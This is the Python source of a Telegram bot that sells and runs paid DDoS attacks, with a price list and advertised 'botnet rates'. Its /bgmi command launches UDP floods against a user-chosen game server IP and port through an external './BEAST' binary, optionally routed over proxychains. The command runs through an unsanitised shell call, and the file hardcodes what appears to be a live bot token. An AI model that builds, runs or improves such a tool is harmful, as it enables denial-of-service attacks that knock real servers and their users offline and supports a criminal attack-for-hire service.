import telebot
import subprocess
import requests
import datetime
import os
import random

# insert your Telegram bot token here
bot = telebot.TeleBot('7286399287:AAGE5bXmQAWBjFOJ8P3Dyx0NDvNrP-TH0D0')

# Admin user IDs
admin_id = ["7286399287"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store proxy list
PROXY_FILE = "lol.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} added successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "YOU ARE NOT AUTHORIZED."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please specify a user ID to remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "YOU ARE NOT AUTHORIZED."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs cleared successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "YOU ARE NOT AUTHORIZED"
    bot.reply_to(message, response)
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "YOU ARE NOT AUTHORIZED."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "YOU ARE NOT AUTHORIZED."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"✅Attack Started.✅\n\n❤‍Tatget: {target}✅\n❤‍Port: {port}✅\n❤‍Time: {time}✅‍ Srconds\n❤‍Method: UDP✅ "
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 60  # 1 minutes

# Function to read proxies from file
def read_proxies():
    try:
        with open(PROXY_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to get a random proxy
def get_random_proxy():
    proxies = read_proxies()
    if proxies:
        return random.choice(proxies)
    return None

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You are on cooldown. Please wait 1 minutes before running the /bgmi command again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 240:
                response = "Error: Time interval must be less than 240 seconds."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                
                # Use a proxy if available
                proxy = get_random_proxy()
                if proxy:
                    full_command = f"proxychains4 -q ./BEAST {target} {port} {time} "
                    os.environ['PROXYCHAINS_PROXY'] = proxy
                else:
                    full_command = f"./BEAST {target} {port} {time} "

                subprocess.run(full_command, shell=True)
                response = f"⌛Attack Completed✅. ❤‍Target: {target} ❤‍Port: {port} ❤‍Time: {time} seconds"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "YOU ARE NOT AUTHORIZED                             Oops! It seems like you don't have permission to use the /bgmi command. To gain access just dm @BEASTXOFFICIAL✅."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your command logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "YOU ARE NOT AUTHORIZED."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''  COMMANDS:
💥 /bgmi : Method for BGMI servers.
💥 /plans : Checkout our botnet rates.

Buy from: @BEASTXOFFICIAL ✅
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f''' Hello Mr❤‍,{user_name}! 
Oops You don't have permission to use this bot        
  ▀▄▀▄You Can▄▀▄▀
   ❤‍Contact the Owner for approval.
  ❤‍@BEASTXOFFICIAL❤‍ Try /help'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, please follow these rules ⚠️:

1. Don't run too many attacks to avoid a ban from the bot.
2. Don't run 2 attacks at the same time to avoid a ban from the bot.
3. We daily check the logs, so follow these rules to avoid a ban!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plans'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, we have only one powerful plan:

VIP 🌟:
-> Attack time: 300 seconds
-> After attack limit: 1 minutes
-> Concurrents attack: 3

Price List 💸:
Day --> 100 Rs
Week --> 400 Rs
Month --> 800 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, admin commands are here:

💥 /add <userId>: Add a user.
💥 /remove <userId>: Remove a user.
💥 /allusers: Authorized users list.
💥 /logs: All users logs.
💥 /broadcast: Broadcast a message.
💥 /clearlogs: Clear the logs file.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message to all users by admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users 👍."
        else:
            response = "🤖 Please provide a message to broadcast."
    else:
        response = "YOU ARE NOT AUTHORIZED.."

    bot.reply_to(message, response)

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
